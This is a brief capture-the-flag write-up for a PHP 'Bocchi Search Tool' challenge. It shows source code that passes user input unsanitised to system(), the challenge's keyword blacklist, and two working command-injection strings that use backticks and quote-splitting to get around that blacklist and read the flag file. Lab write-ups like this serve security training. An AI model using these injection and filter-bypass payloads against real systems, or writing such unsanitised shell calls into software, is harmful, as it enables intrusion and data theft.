# Bocchi Search Tool
A tool help you find bocchi in json !
http://ctf.adl.tw:12001/

You input a json like string, and the program finds the "bocchi" member and prints its value.
# foot note
- anything on a shell command contained in pairs of`` gets executed as commands!!!
# solution
blacklist(php)
```php
$blacklist = ['|', '&', ';', '>', '<', "\n", '?', '*', '$', '\\', 'cat', 'flag'];
```

source code(php): 
```php
system("echo '" . $_POST['json'] . "'| jq .bocchi");
```

- attack string ver 1: '`tac  fl''ag` #
```php
system("echo '" . '`tac  fl''ag` # . "'| jq .bocchi");
```
which equals:
```bash
echo ''`tac  fl''ag` # . "'| jq .bocchi
```

- attack string ver 2: '`c''at  fl''ag` #
```php
system("echo '" .'`c''at  fl''ag` # . "'| jq .bocchi");
```

